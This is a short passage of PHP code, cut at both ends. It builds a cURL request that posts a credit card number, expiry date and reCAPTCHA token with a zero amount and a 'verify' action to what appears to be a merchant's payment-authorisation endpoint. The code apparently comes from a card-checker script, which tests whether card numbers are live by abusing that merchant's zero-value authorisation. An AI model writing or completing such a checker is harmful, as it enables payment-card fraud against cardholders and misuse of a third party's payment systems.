...
curl_setopt_array($curl, [
  ...
  CURLOPT_POSTFIELDS => '{"configurationId":"2286d42d-3518-43d9-afcf-e41c766da71d","prodIdAlias":"TWJ","recaptchaResponse":"'.$grecaptcha.'","appSource":"engage","CVC":false,"addressVerificationCodes":[],"paymentService":"CPS","oneTimeAuthorization":{"actionCode":"verify","transactionType":"7","creditCardNumber":"'.$creditCardNumber.'","creditCardType":"MC","creditCardCVV":"","creditCardExpireMonth":"'.$mes.'","creditCardExpireYear":"'.$ano2.'","amount":"000","currencyCode":"840","countryCode":"","merchantOrderId":"f3015da0","creditCardEncrypted":true,"encryptionSource":"CDS","tokenize":true,"address":{"name":"","addressLine1":"","city":"","state":"","postalCode":""}},"pwTransSource":"PC"}',
  CURLOPT_HTTPHEADER => [
